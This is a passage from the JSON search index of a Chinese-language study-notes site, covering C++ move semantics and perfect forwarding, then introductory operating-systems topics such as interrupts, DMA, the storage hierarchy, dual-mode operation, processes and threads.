<code>std::move()</code>\uff0c\u53ef\u4ee5\u5c06\u4e00\u4e2a\u5de6\u503c\u5f3a\u5236\u8f6c\u5316\u4e3a\u53f3\u503c\u5f15\u7528\uff0c\u7ee7\u800c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u53f3\u503c\u5f15\u7528\u4f7f\u7528\u8be5\u503c\uff0c\u7528\u4e8e\u79fb\u52a8\u8bed\u4e49 <li>\u88ab\u8f6c\u5316\u7684\u5de6\u503c\uff0c\u5176\u751f\u547d\u671f\u5e76\u672a\u968f\u5de6\u53f3\u503c\u7684\u8f6c\u5316\u800c\u6539\u53d8</li> <li>\u5728\u7f16\u5199\u79fb\u52a8\u6784\u9020\u51fd\u6570\u65f6\uff0c\u5e94\u603b\u662f\u4f7f\u7528 <code>std::move()</code> \u8f6c\u6362\u62e5\u6709\u5f62\u5982\u5806\u5185\u5b58\u3001\u6587\u4ef6\u53e5\u67c4\u7b49\u8d44\u6e90\u7684\u6210\u5458\u4e3a\u53f3\u503c\u3002\u8fd9\u6837\u4e00\u6765\uff0c\u5982\u679c\u6210\u5458\u652f\u6301\u79fb\u52a8\u6784\u9020\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u5176\u79fb\u52a8\u8bed\u4e49\uff08\u5373\u4f7f\u6210\u5458\u65e0\u79fb\u52a8\u6784\u9020\u51fd\u6570\uff0c\u4e5f\u4f1a\u8c03\u7528\u62f7\u8d1d\u6784\u9020\uff0c\u56e0\u4e3a\u4e0d\u4f1a\u5f15\u8d77\u5927\u7684\u95ee\u9898\uff09</li> <p>\u79fb\u52a8\u8bed\u4e49\u4e00\u5b9a\u662f\u8981\u6539\u53d8\u4e34\u65f6\u53d8\u91cf\u7684\u503c</p> <ul> <li> <p><code>Moveable c(move(a));</code> </p> <ul> <li>\u8fd9\u91cc\u7684 <code>a</code> \u672c\u6765\u662f\u4e00\u4e2a\u5de6\u503c\u53d8\u91cf\uff0c\u901a\u8fc7 <code>std::move</code> \u5c06\u5176\u8f6c\u6362\u4e3a\u53f3\u503c</li> <li>\u8fd9\u6837\u4e00\u6765\uff0c<code>a.i</code> \u5c31\u88ab <code>c</code> \u7684\u79fb\u52a8\u6784\u9020\u51fd\u6570\u8bbe\u7f6e\u4e3a\u6307\u9488\u7a7a\u503c\u3002\u7531\u4e8e <code>a</code> \u7684\u751f\u547d\u671f\u5b9e\u9645\u8981\u5230\u6240\u5728\u51fd\u6570\u7ed3\u675f\u624d\u7ed3\u675f\uff0c\u90a3\u4e48\u968f\u540e\u5bf9\u8868\u8fbe\u5f0f <code>*a.i</code> \u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u5c31\u4f1a\u53d1\u751f\u4e25\u91cd\u7684\u8fd0\u884c\u65f6\u9519\u8bef</li> </ul> </li> <li> <p>\u5728 C++11 \u4e2d\uff0c\u62f7\u8d1d/\u79fb\u52a8\u6784\u9020\u51fd\u6570\u6709\u4ee5\u4e0b 3 \u4e2a\u7248\u672c\uff1a</p> <pre><code>T Object(T&amp;)\nT Object(const T&amp;)\nT Object(T&amp;&amp;)\n</code></pre> <ul> <li>\u5176\u4e2d\u5e38\u91cf\u5de6\u503c\u5f15\u7528\u7684\u7248\u672c\u662f\u4e00\u4e2a\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u7248\u672c\uff0c\u53f3\u503c\u5f15\u7528\u53c2\u6570\u662f\u4e00\u4e2a\u79fb\u52a8\u6784\u9020\u51fd\u6570\u7248\u672c</li> <li>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u7f16\u8bd1\u5668\u4f1a\u4e3a\u7a0b\u5e8f\u5458\u9690\u5f0f\u751f\u6210\u4e00\u4e2a\u79fb\u52a8\u6784\u9020\u51fd\u6570\uff0c\u4f46\u5982\u679c\u58f0\u660e\u4e86\u81ea\u5df1\u5b9a\u4e49\u7684\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u3001\u62f7\u8d1d\u8d4b\u503c\u51fd\u6570\u3001\u79fb\u52a8\u6784\u9020\u51fd\u6570\u3001\u6790\u6784\u51fd\u6570\u4e2d\u7684\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\uff0c\u7f16\u8bd1\u5668\u90fd\u4e0d\u4f1a\u518d\u751f\u6210\u9ed8\u8ba4\u7248\u672c</li> <li>\u6240\u4ee5\u5728 C++11 \u4e2d\uff0c\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u3001\u62f7\u8d1d\u8d4b\u503c\u51fd\u6570\u3001\u79fb\u52a8\u6784\u9020\u51fd\u6570\u548c\u79fb\u52a8\u8d4b\u503c\u51fd\u6570\u5fc5\u987b\u540c\u65f6\u63d0\u4f9b\uff0c\u6216\u540c\u65f6\u4e0d\u63d0\u4f9b\uff0c\u53ea\u58f0\u660e\u5176\u4e2d\u4e00\u4e2a\u7684\u8bdd\uff0c\u7c7b\u90fd\u4ec5\u80fd\u5b9e\u73b0\u4e00\u79cd\u8bed\u4e49</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec12/#perfact-forwarding", "title": "Perfact Forwarding | \u5b8c\u7f8e\u8f6c\u53d1", "text": "<ul> <li>\u5b8c\u7f8e\u8f6c\u53d1\uff0c\u662f\u6307\u5728\u6a21\u677f\u51fd\u6570\u4e2d\uff0c\u5b8c\u5168\u4f9d\u7167\u6a21\u677f\u7684\u53c2\u6570\u7c7b\u578b\u5c06\u53c2\u6570\u4f20\u9012\u7ed9\u6a21\u677f\u4e2d\u8c03\u7528\u7684\u53e6\u4e00\u4e2a\u51fd\u6570</li> </ul> <pre><code>template &lt;typename T&gt;\nvoid IamForwarding(T t)\n{\n    IrunCodeActually(t);\n}\n</code></pre> <ul> <li>\u56e0\u4e3a\u4f7f\u7528\u6700\u57fa\u672c\u7c7b\u578b\u8f6c\u53d1\uff0c\u4f1a\u5728\u4f20\u53c2\u7684\u65f6\u5019\u4ea7\u751f\u4e00\u6b21\u989d\u5916\u7684\u4e34\u65f6\u5bf9\u8c61\u62f7\u8d1d</li> <li>\u6240\u4ee5\u901a\u5e38\u9700\u8981\u7684\u662f\u4e00\u4e2a\u5f15\u7528\u7c7b\u578b\uff0c\u5c31\u4e0d\u4f1a\u6709\u62f7\u8d1d\u7684\u5f00\u9500\u3002\u5176\u6b21\u9700\u8981\u8003\u8651\u51fd\u6570\u5bf9\u7c7b\u578b\u7684\u63a5\u53d7\u80fd\u529b\uff0c\u56e0\u4e3a\u76ee\u6807\u51fd\u6570\u53ef\u80fd\u9700\u8981\u65e2\u63a5\u53d7\u5de6\u503c\u5f15\u7528\uff0c\u53c8\u63a5\u53d7\u53f3\u503c\u5f15\u7528\uff0c\u5982\u679c\u8f6c\u53d1\u51fd\u6570\u53ea\u80fd\u63a5\u53d7\u5176\u4e2d\u7684\u4e00\u90e8\u5206\uff0c\u4e5f\u4e0d\u5b8c\u7f8e</li> </ul> \u8003\u8651\u7c7b\u578b\u8f6c\u53d1\u51fd\u6570\u4e3a <pre><code>typedef const A T;\ntypedef T&amp; TR;\nTR&amp; v = 1;\n</code></pre> <ul> <li>\u5728 C++11 \u4e2d\u5f15\u5165\u4e86\u4e00\u6761\u6240\u8c13\u201d\u5f15\u7528\u6298\u53e0\u201c\u7684\u65b0\u8bed\u8a00\u89c4\u5219</li> </ul> TR \u7684\u7c7b\u578b\u5b9a\u4e49 \u58f0\u660e v \u7684\u7c7b\u578b v \u7684\u5b9e\u9645\u7c7b\u578b T&amp; TR A&amp; T&amp; TR&amp; A&amp; T&amp; TR&amp;&amp; A&amp; T&amp;&amp; TR A&amp;&amp; T&amp;&amp; TR&amp; A&amp; <pre><code>template &lt;typename T&gt;\nvoid IamForwarding(T&amp;&amp; t)\n{\n    IrunCodeActually(static_cast&lt;T&amp;&amp;&gt;(t));\n}\n</code></pre> <ul> <li> <p>\u5bf9\u4e8e\u4f20\u5165\u7684\u53f3\u503c\u5f15\u7528</p> <pre><code>void IamForwarding(X&amp;&amp; &amp;&amp; t)\n{\n    IrunCodeActually(static_cast&lt;X&amp;&amp; &amp;&amp;&gt;(t));\n}\n</code></pre> </li> <li> <p>\u6298\u53e0\u540e\u662f</p> <pre><code>void IamForwarding(X&amp;&amp; t)\n{\n    IrunCodeActually(static_cast&lt;X&amp;&amp;&gt;(t));\n}\n</code></pre> </li> </ul>"}, {"location": "Course/System2/", "title": "\u8ba1\u7b97\u673a\u7cfb\u7edf\u2161", "text": "<p> \u7ea6 79 \u4e2a\u5b57 </p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u2161 \u662f ZJU \u8ba1\u7b97\u673a\u7cfb\u7edf\u7cfb\u5217\u8bfe\u7a0b\u4e4b\u4e00\uff0c\u5305\u62ec\u8ba1\u7ec4\u540e\u534a\u90e8\u5206\u548c\u64cd\u4f5c\u7cfb\u7edf\u524d\u534a\u90e8\u5206\u5185\u5bb9</p> \u671f\u672b\u8865\u5929 <ul> <li> \u8ba1\u7ec4\u671f\u672b.pdf</li> <li> OS \u671f\u672b.pdf</li> </ul> <p>\u53ea\u505a\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\uff0c\u7981\u6b62\u88ab\u7528\u4e8e\u5546\u4e1a\u5316\u7528\u9014</p>"}, {"location": "Course/System2/Lec01_Introduction/", "title": "Introduction", "text": "<p> \u7ea6 2519 \u4e2a\u5b57  89 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 10 \u5206\u949f</p> <ul> <li>Introduction<ul> <li>Interrupts and Traps</li> <li>Interrupt Handling</li> <li>Interrupt-drive I/O Cycle</li> <li>I/O: from System Call to Devices, and Back</li> <li>Direct Memory Access | DMA</li> <li>Storage Structure</li> <li>Storage Hierarchy<ul> <li>Performance of Storages</li> </ul> </li> <li>Caching</li> <li>MUltiprocessor Systems<ul> <li>Symmetric Multiprocessing Architecture</li> <li>NUMA</li> <li>Clustered Systems</li> <li>Distributed Systems</li> <li>Special-Purpose Systems</li> <li>Dual-mode operation**</li> <li>Transition between Modes</li> <li>Timer</li> <li>Process | \u8fdb\u7a0b<ul> <li>Resource Management: Process Management</li> <li>Process Management Activities</li> </ul> </li> <li>Thread | \u7ebf\u7a0b<ul> <li>From Process to Thread</li> </ul> </li> <li>Resource Management: Memory Management | \u5185\u5b58\u7ba1\u7406</li> <li>Resource Management: File Systems | \u6587\u4ef6\u7cfb\u7edf</li> <li>Resource Management: I/O System Management</li> <li>Separate Policy and Mechanism</li> <li>Virtualization</li> </ul> </li> <li>Three pieces\u4e2d\u7684Introduction<ul> <li>What happens when a program runs?</li> <li>All about Virtualization</li> <li>Virtualizing The CPU</li> <li>Virtualizing Memory</li> <li>Concurrency | \u5e76\u53d1</li> <li>I/O</li> </ul> </li> </ul> </li> </ul> <p>Introduction\u57fa\u672c\u662f\u7cfb\u7edf\u2161\u4e2d\u6574\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u90e8\u5206\u8bfe\u4e0a\u8981\u8bb2\u7684\u5185\u5bb9</p>"}, {"location": "Course/System2/Lec01_Introduction/#interrupts-and-traps", "title": "Interrupts and Traps", "text": "<ul> <li>Interrupt transfers control to the interrupt service routine </li> <li> <p>interrupt vector: a table containing addresses of all the service routines</p> </li> <li> <p>incoming interrupts are disabled while serving another interrupt to prevent a lost interrupt</p> </li> <li> <p>interrupt handler must save the (interrupted) execution states</p> </li> <li> <p>A trap is a software-generated interrupt, caused either by an error or a user request</p> </li> </ul> <p>error-&gt;\u6bd4\u5982\u9664\u6cd5\u6307\u4ee4\u88ab\u9664\u6570\u662f0\uff0cuser request-&gt;\u7528\u6237\u663e\u5f0f\u4ea7\u751f\u7684trap\u6bd4\u5982\u7cfb\u7edf\u8c03\u7528\uff0csvc\u6307\u4ee4\u7b49</p> <ul> <li> <p>an interrupt is asynchronous; a trap is synchronous</p> </li> <li> <p>e.g., system call, divided-by-zero exception, general protection exception\u2026</p> </li> <li> <p>Operating systems are usually interrupt-driven(\u6709\u5b9a\u65f6\u5668\u4e2d\u65ad\uff0c\u76f8\u5e94I/O\u4e2d\u65ad\u7b49\u7b49)</p> </li> </ul> <p>\u7528\u6237\u6001\u7684\u7a0b\u5e8f\u4e0d\u5141\u8bb8\u76f4\u63a5\u64cd\u63a7\u78c1\u76d8\u63a7\u5236\u5668\uff0c\u4f46\u53c8\u9700\u8981\u8bfb\u53d6\u5176\u4e2d\u7684\u6587\u4ef6\uff0c\u4f1a\u901a\u8fc7\u8fd0\u884c\u5728\u7279\u6743\u6001\u7684\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u64cd\u4f5c\uff08\u7cfb\u7edf\u8c03\u7528\uff09</p>"}, {"location": "Course/System2/Lec01_Introduction/#interrupt-handling", "title": "Interrupt Handling", "text": "<ul> <li> <p>Operating system preserves the execution state of the CPU</p> </li> <li> <p>save registers and the program counter (PC)</p> <p>\u4fdd\u5b58\u4e0a\u4e0b\u6587\u2014\u2014\u5bc4\u5b58\u5668\u548cPC\uff08\u4fdd\u5b58\u5230\u5185\u5b58\uff09</p> </li> <li> <p>OS determines which device caused the interrupt</p> </li> </ul> <ol> <li> <p>polling </p> <p>polling\u65b9\u5f0f\u7684\u4e2d\u65ad\uff0c\u4e0d\u8bba\u4ec0\u4e48\u7c7b\u578b\u4e2d\u65ad\u90fd\u4f1a\u5747\u4e3a\u8df3\u8f6c\u5230\u4e00\u4e2a\u7edf\u4e00\u7684\u5165\u53e3\uff0c\u7136\u540e\u7531\u8f6f\u4ef6\u53bb\u67e5\u8be2\u5bc4\u5b58\u5668\u4ece\u800c\u77e5\u9053\u4e2d\u65ad\u7684\u6765\u6e90</p> </li> <li> <p>vectored interrupt system</p> <p>\u786c\u4ef6\u5df2\u7ecf\u56fa\u5b9a\u597d\uff08\u533a\u5206\u597d\u4e2d\u65ad\u7c7b\u578b\uff0c\u4e0d\u9700\u8981\u8f6f\u4ef6\u518d\u53bb\u67e5\u8be2\uff09\uff0c\u4f1a\u76f4\u63a5\u8df3\u8f6c\u5230\u5bf9\u5e94\u5730\u5740</p> </li> </ol> <ul> <li>OS handles the interrupt by calling the device\u2019s driver\uff08\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\uff09</li> </ul> <p>\u5b8f\u5185\u6838\u7684\u91cd\u8981\u7ec4\u4ef6\u3002\u800c\u5bf9\u4e8e\u5fae\u5185\u6838\uff0c\u5f80\u5f80\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u653e\u5728\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u8303\u56f4\u5916\uff0c\u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u5e38\u5c06\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u7684\u5927\u90e8\u5206\u4ee3\u7801\u79fb\u5230\u7528\u6237\u6001\u3002</p> <ul> <li>OS restores the CPU execution to the saved state</li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#interrupt-drive-io-cycle", "title": "Interrupt-drive I/O Cycle", "text": "<p>to be continued</p> <p></p> <ul> <li><code>device driver initiates I/O</code>\u662f\u901a\u8fc7<code>MMIO</code>|<code>Memory Map I/O</code>\u7684\u65b9\u5f0f\uff0c\u5b9e\u9645\u662f\u901a\u8fc7<code>STORE</code>\u6307\u4ee4\u53bb\u64cd\u4f5c\u5916\u8bbe\u7684\u4e2d\u65ad\u63a7\u5236\u5668\u7684\u5730\u5740\uff1b</li> <li>\u56e0\u4e3ainitiates I/O\uff0c\u5199\u78c1\u76d8\u662f\u5f88\u6162\u7684\u8fc7\u7a0b\uff0cCPU\u4e0d\u4f1a\u4e00\u76f4\u7b49\u5230I/O\u8bf7\u6c42\u5b8c\u6210\uff0c\u5f53\u78c1\u76d8\u5199\u5b8c\u540e\u4f1a\u6709\u56fe\u4e2d<code>4</code>\u4ee5Interrupt\u7684\u5f62\u5f0f\u544a\u8bc9CPU\uff08\u4e2d\u65ad\u63a7\u5236\u5668\u786c\u8fde\u7ebf\u7684\u65b9\u5f0f\uff09</li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#io-from-system-call-to-devices-and-back", "title": "I/O: from System Call to Devices, and Back", "text": "<ul> <li>A program uses a system call to access system resources</li> <li>e.g., files, network</li> <li> <p>Operating system converts it to device access and issues I/O requests</p> </li> <li> <p>I/O requests are sent to the device driver, then to the controller</p> </li> <li> <p>e.g., read disk blocks, send/receive packets\u2026</p> </li> <li> <p>OS puts the program to wait (synchronous I/O) or returns to it without waiting (asynchronous I/O)</p> </li> <li> <p>OS may switches to another program when the requester is waiting</p> <p>\u5373\u4f7f\u662f\u540c\u6b65I/O, CPU\u4e5f\u4e0d\u662f\u76f2\u76ee\u7b49\u5f85\u72b6\u6001\u3002\u67d0\u4e00\u8fdb\u7a0b\u963b\u585e\u65f6\uff0cCPU\u53ef\u4ee5\u8c03\u5ea6\u53e6\u4e00\u8fdb\u7a0b</p> </li> <li> <p>I/O completes and the controller interrupts the OS</p> </li> <li> <p>OS processes the I/O, and then wakes up the program (synchronous I/O) or send its a signal (asynchronous I/O)</p> </li> </ul> <p>\u4e00\u79cd\u81ea\u4e0a\u800c\u4e0b\uff0c\u4e00\u79cd\u81ea\u4e0b\u800c\u4e0a</p>"}, {"location": "Course/System2/Lec01_Introduction/#direct-memory-access-dma", "title": "Direct Memory Access | DMA", "text": "<ul> <li>DMA is used for high-speed I/O devices able to transmit information at close to memory speeds </li> <li> <p>e.g., Ethernet, hard disk, cd rom\u2026</p> </li> <li> <p>Device driver sends an I/O descriptor the controller</p> </li> <li> <p>I/O descriptor: operation type (e.g., send/receive), memory address\u2026</p> </li> <li> <p>The controller transfers blocks of data between its local buffer and main memory without CPU intervention(\u63d0\u9ad8\u6548\u7387)</p> </li> </ul> <p>CPU\u4f1a\u544a\u8bc9\u663e\u5361\u9700\u8981\u7684\u6570\u636e\u8d77\u59cb\u5730\u5740\u5728\u54ea\uff0c\u6709\u591a\u957f\uff0c\u968f\u540e\u7531DMA\u642c\u8fd0\u6570\u636e\u3002\u642c\u8fd0\u7ed3\u675f\u4f1a\u901a\u8fc7\u786c\u4e2d\u65ad\u7684\u65b9\u5f0f\u544a\u8bc9CPU</p> <ul> <li>only one interrupt is generated when whole I/O request completes</li> </ul> <p>\u78c1\u76d8\u63a7\u5236\u5668\u5206\u4e3a\u5e38\u89c1\u7684HDD\u548cSSD</p>"}, {"location": "Course/System2/Lec01_Introduction/#storage-structure", "title": "Storage Structure", "text": "<ul> <li>Main memory: the only large storage that CPU can directly access</li> <li> <p>random access, and typically volatile</p> </li> <li> <p>Secondary storage: large nonvolatile storage capacity</p> </li> <li> <p>Magnetic disks are most common second-storage devices (HDD)\uff08\u7cfb\u7edf\u2162\uff09</p> <ul> <li>rigid metal or glass platters covered with magnetic recording material </li> </ul> </li> <li> <p>disk surface is logically divided into tracks and sectors</p> </li> <li> <p>disk controller determines the interaction between OS and the device</p> </li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#storage-hierarchy", "title": "Storage Hierarchy", "text": "<ul> <li>Storage systems can be organized in hierarchy</li> <li>speed</li> <li>cost</li> <li>volatility</li> </ul> <ul> <li>Caching: copying information into faster storage system</li> <li>main memory can be viewed as a cache for secondary storage</li> <li>CPU has a cache for main memory</li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#performance-of-storages", "title": "Performance of Storages", "text": "Level 1 2 3 4 Name register cache main memory disk storage Typical size &lt; 1 KB &gt; 16 MB &gt; 16 GB &gt; 100 GB Implementation technology custom memory with multiple ports, CMOS on-chip or off-chip CMOS SRAM CMOS DRAM magnetic disk Access time(ns) 0.25-0.5 0.5-25 80-250 5,000.000 Bandwidth(MB/sec) 20,000-100,000 5000-10,000 1000-5000 20-150 Managed by compiler hardware operating system operating system Backed by cache main memory disk CD or tape"}, {"location": "Course/System2/Lec01_Introduction/#caching", "title": "Caching", "text": "<ul> <li>Caching is an important principle, performed at many levels</li> <li>e.g., in hardware, operating system, user program\u2026</li> <li>Caching: data in use copied from slower to faster storage temporarily</li> <li> <p>faster storage (cache) is checked first to determine if data is there</p> </li> <li> <p>if it is, data is used directly from the cache (fast)</p> </li> <li> <p>if not, data is first copied to cache and used there</p> </li> <li>Cache is usually smaller than storage being cached</li> <li>Cache management is an important design problem</li> <li>e.g., cache size and replacement policy</li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#multiprocessor-systems", "title": "MUltiprocessor Systems", "text": "<ul> <li> <p>Most old systems have one single general-purpose processor</p> </li> <li> <p>e.g., smartphone, PC, server, mainframe</p> </li> <li> <p>most systems also have special-purpose processors as well</p> </li> <li> <p>Multiprocessor systems have grown in use and importance</p> </li> <li> <p>also known as parallel systems, tightly-coupled systems</p> </li> <li> <p>advantages: increased throughput, economy of scale, increased reliability \u2013 graceful degradation or fault tolerance</p> </li> <li> <p>two types: asymmetric multiprocessing and symmetric multiprocessing (SMP)</p> </li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#symmetric-multiprocessing-architecture", "title": "Symmetric Multiprocessing Architecture", "text": "<p>\u5404CPU\u6709\u540c\u7b49\u5730\u4f4d</p> <p></p>"}, {"location": "Course/System2/Lec01_Introduction/#numa", "title": "NUMA", "text": "<ul> <li>Non-Uniform Memory Access System</li> <li>Access local memory is fast, scale well</li> </ul> <p>\u6bcf\u4e2aCPU\u6709\u81ea\u5df1\u7684memory\uff0c\u4f46\u6240\u6709\u7684memory\u662f\u7edf\u4e00\u7f16\u5236\u7684\uff0c\u5373CPU\u53ef\u4ee5\u8bbf\u95ee\u6240\u6709memory</p> <p></p>"}, {"location": "Course/System2/Lec01_Introduction/#clustered-systems", "title": "Clustered Systems", "text": "<ul> <li>Multiple systems work together through high-speed network</li> <li> <p>usually sharing storage via a storage-area network (SAN)</p> </li> <li> <p>Clusters provide a high-availability service that can survive failures</p> </li> <li>asymmetric clustering has one machine in hot-standby mode</li> <li> <p>symmetric clustering has multiple nodes running applications, monitoring each other</p> </li> <li> <p>Some clusters are designed for high-performance computing (HPC)</p> </li> <li>applications must be written to use parallelization</li> </ul> <p></p>"}, {"location": "Course/System2/Lec01_Introduction/#distributed-systems", "title": "Distributed Systems", "text": "<ul> <li> <p>A collection of separate, possibly heterogeneous, systems inter-connected through networks</p> </li> <li> <p>Network OS allows systems to exchange messages</p> </li> <li> <p>A distributed system creates the illusion of a single system</p> </li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#special-purpose-systems", "title": "Special-Purpose Systems", "text": "<ul> <li>Real-time embedded systems most prevalent form of computers</li> <li>vary considerably</li> <li>use special purpose (limited purpose) real-time OS</li> </ul> <p>\u8f6f\u5b9e\u65f6\uff1a\u4e0d\u4e25\u683c\u5728\u56fa\u5b9a\u65f6\u95f4\u5b8c\u6210\uff0c\u786c\u5b9e\u65f6\uff08\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u65e0\u5d4c\u5957\uff09\uff1a\u4e25\u683c\u6309\u7167\u8981\u6c42\u5728\u56fa\u5b9a\u65f6\u95f4\u5b8c\u6210\uff08\u4e0d\u591a\u4e0d\u5c11\uff09</p> <ul> <li>Multimedia systems</li> <li> <p>streams of data must be delivered according to time restrictions</p> </li> <li> <p>Handheld systems</p> </li> <li> <p>e.g., PDAs, smart phones</p> </li> <li> <p>limited CPU (?), memory(?), and power</p> </li> <li> <p>used to use reduced feature OS (?)</p> </li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#dual-mode-operation", "title": "Dual-mode operation**", "text": "<ul> <li>Operating system is usually interrupt-driven </li> <li> <p>Efficiency, regain control (timer interrupt)</p> </li> <li> <p>Dual-mode operation allows OS to protect itself and other system components</p> </li> <li> <p>user mode and kernel mode (or other names)</p> </li> <li> <p>a mode bit distinguishes when CPU is running user code or kernel code</p> </li> <li> <p>some instructions designated as privileged, only executable in kernel</p> </li> <li> <p>system call changes mode to kernel, return from call resets it to user</p> </li> </ul> <ol> <li> <p>\u5206\u4e3a\u4e24\u4e2a\u6a21\u5f0f\u662f\u4e3a\u4e86\u9694\u79bb\uff0c\u9632\u6b62\u7528\u6237\u6001\u7a0b\u5e8f\u53bb\u5e72\u6270\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u7684\u6570\u636e\u6216\u6570\u636e\u7ed3\u6784\u3002</p> </li> <li> <p>\u5e38\u7528MMU\u90e8\u4ef6\uff08Memory Management Unit | \u5185\u5b58\u7ba1\u7406\u5355\u5143\uff09\u6765\u6307\u5b9a\u5f53CPU\u8fd0\u884c\u5728\u7279\u6743\u6001\u65f6\u53ef\u4ee5\u8bbf\u95ee\u6240\u6709\u7269\u7406\u5730\u5740\u7a7a\u95f4\uff0c\u5728\u7528\u6237\u6001\u4e0b\u53ea\u80fd\u8bbf\u95ee\u6709\u9650\u7a7a\u95f4\u8fbe\u5230\u4e8c\u8005\u7684\u9694\u79bb</p> </li> <li>\u90e8\u5206\u6307\u4ee4\u5fc5\u987b\u5728\u7279\u6743\u6001\u4e0b\u8fd0\u884c\uff0c\u6bd4\u5982\u5173\u95ed\u4e2d\u65ad\uff0c\u6253\u5f00\u4e2d\u65ad\u3001\u914d\u7f6eMMU\u7684\u6307\u4ee4</li> </ol>"}, {"location": "Course/System2/Lec01_Introduction/#transition-between-modes", "title": "Transition between Modes", "text": "<ul> <li>System calls, exception, interrupts cause transitions between kernel/user modes</li> </ul>"}, {"location": "Course/System2/Lec01_Introduction/#timer", "title": "Timer", "text": "<ul> <li> <p>Timer used to prevent infinite loop or process hogging resources</p> </li> <li> <p>to enable a timer, set the hardware to interrupt after some period </p> </li> <li> <p>OS sets up a timer before scheduling process to regain control</p> <ul> <li> <p>the timer for scheduling is usually periodical(e.g., 250HZ)</p> </li> <li> <p>tickless kernel: on-demand timer interrupts(Linux)</p> </li> </ul> </li> </ul> <p>\u8fdb\u7a0b\u662f\u8d44\u6e90\u5206\u914d\u7684\u6700\u5c0f\u5355\u5143\uff0c\u7ebf\u7a0b\u662f\u8c03\u5ea6\u7684\u6700\u5c0f\u5355\u5143</p>"}, {"location": "Course/System2/Lec01_Introduction/#process", "title": "Process | \u8fdb\u7a0b", "text": "<p>Process is the unit of resource allocation</p>"}, {"location": "Course/System2/Lec01_Introduction/#resource-management-process-management", "title": "Resource Management: Process Management", "text": "<ul> <li> <p>A process is a program in execution</p> </li> <li> <p>program is a passive entity, process is an active entity</p> </li> <li> <p>a system has many processes running concurrently</p> </li> </ul> <p>\u4e0d\u540c\u8fdb\u7a0b\u4e4b\u95f4\u662f\u9694\u79bb\u7684\uff0c\u5373\u4f7f\u662f\u540c\u4e00\u4e2aprogram\u52a0\u8f7d\u7684\u8fdb\u7a0b</p> <ul> <li> <p>Process needs resources to accomplish its task</p> </li> <li> <p>OS reclaims all reusable resources upon process termination</p> </li> <li> <p>e.g., CPU, memory, I/O, files, initialization data</p> </li> <li> <p>\u8fdb\u7a0b\u662f\u8d44\u6e90\u5206\u914d\u7684\u6700\u5c0f\u5355\u5143\uff0c\u7ebf\u7a0b\u662f\u8c03\u5ea6\u7684\u6700\u5c0f\u5355\u5143</p> </li> </ul> <p>\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u4f1a\u7ba1\u7406\u5206\u914d\u7ed9\u6bcf\u4e00\u4e2a\u5185\u6838\u7684CPU\u8d44\u6e90\u3001memory\u8d44\u6e90\u3001I/O\u8d44\u6e90\u2026\u2026\u662f\u901a\u8fc7\u5206\u65f6\u590d\u7528\u7684\u65b9\u5f0f\uff0c\u65f6\u95f4\u7247\u8f6e\u8f6c\uff0c\u6bcf\u4e00\u4e2aprocess\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\u5c31\u5f00\u59cb\u6839\u636e\u4f18\u5148\u7ea7\u8c03\u5ea6</p>"}, {"location": "Course/System2/Lec01_Introduction/#process-management-activities", "title": "Process Management Activities", "text": "<ul> <li> <p>Process creation and termination | \u521b\u5efa\u548c\u4e2d\u6b62</p> </li> <li> <p>Processes suspension and resumption | \u6682\u505c\u548c\u6062\u590d</p> </li> <li> <p>Process synchronization primitives | \u540c\u6b65</p> </li> <li> <p>Process communication primitives | \u901a\u4fe1</p> </li> <li> <p>Deadlock handling | \u6b7b\u9501</p> </li> </ul> <p>\u5728\u786c\u4ef6\u5c42\u9762\uff0c\u4e0d\u540c\u7684<code>cpu core</code>\u4e0a\u6709\u4e0d\u540c\u7684<code>register set | \u5bc4\u5b58\u5668\u96c6\u5408</code>\uff1b</p> <p>\u540c\u65f6\uff0c\u4e0d\u540c<code>cpu core</code>\u4e0a\u4e2d\u65ad\u4e5f\u662f\u5355\u72ec\u7684\uff0c\u5373\u6bcf\u4e2acore\u90fd\u53ef\u4ee5\u54cd\u5e94\u4efb\u4f55\u6743\u9650\u5185\u7684\u4e2d\u65ad\u3002</p>          \u8003 \u8bd5 &amp; \u8003 \u7814 \u91cd \u70b9\uff1a\u8fdb \u7a0b \u72b6 \u6001 \u7684 \u5207 \u6362               \u8be6\u7ec6\u72b6\u6001\u5207\u6362\u540e\u8bae      <p></p>"}, {"location": "Course/System2/Lec01_Introduction/#thread", "title": "Thread | \u7ebf\u7a0b", "text": ""}, {"location": "Course/System2/Lec01_Introduction/#from-process-to-thread", "title": "From Process to Thread", "text": "<ul> <li> <p>Single-threaded process has one program counter </p> </li> <li> <p>program counter specifies location of next instruction to execute</p> </li> <li> <p>processor executes instructions sequentially, one at a time, until completion</p> </li> </ul> <p>\u7ebf\u7a0b\u4e4b\u95f4\u662f\u4e0d\u9694\u79bb\u7684</p> <ul> <li> <p>Multi-threaded process has one program counter per thread</p> </li> <li> <p>Quiz: What are the benefits of using thread instead of process?</p> </li> </ul> 